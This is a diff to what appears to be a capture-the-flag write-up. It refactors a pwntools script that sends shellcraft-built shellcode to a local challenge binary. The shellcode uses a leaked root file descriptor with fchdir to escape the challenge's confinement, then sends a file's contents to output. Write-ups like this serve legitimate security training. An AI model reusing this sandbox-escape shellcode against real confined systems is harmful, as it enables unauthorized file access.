@@ -101,11 +101,10 @@ The following Python script uses `pwntools` and `shellcraft` to generate the ass
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # Pass '/' to leak the root FD
-p = process([exe, "/"])
+p = process([elf.path, "/"])
 
 # Refactored to shellcraft
 # 1. fchdir(3) - Change directory to the leaked root FD
@@ -121,5 +120,6 @@ sc += shellcraft.sendfile(1, 'rax', 0, 100)
 sc += shellcraft.exit(0)
 
 p.send(asm(sc))
-p.interactive()
+print(p.recvall().decode())
+p.close()
 ```
